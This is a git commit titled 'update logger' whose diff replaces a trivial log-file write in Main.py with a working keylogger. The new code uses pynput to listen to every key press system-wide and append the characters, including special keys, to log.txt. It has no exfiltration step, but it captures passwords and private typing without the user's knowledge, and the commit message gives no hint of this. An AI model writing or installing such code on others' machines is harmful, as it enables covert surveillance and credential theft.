22c416a66f075bc4627396a9da7da7ab5ed035af
Lutfi <lutfilawliet2.0@gmail.com>
2025-06-27 20:02:27 +0700

    update logger

--- Main.py
+++ Main.py
@@ -1,2 +1,20 @@
-with open ("log.txt", "w") as file:
-    file.write("This is a log file.\n")
+from pynput.keyboard import Listener, Key
+
+def writeData(key):
+    try:
+        letter = key.char
+    except AttributeError:
+        if key == Key.space:
+            letter = ' '
+        elif key == Key.enter:
+            letter = '\n'
+        elif key == Key.tab:
+            letter = '\t'
+        else:
+            letter = f'[{key.name}]'
+
+    with open("log.txt", "a") as file:
+        file.write(letter)
+
+with Listener(on_press=writeData) as listener:
+    listener.join()
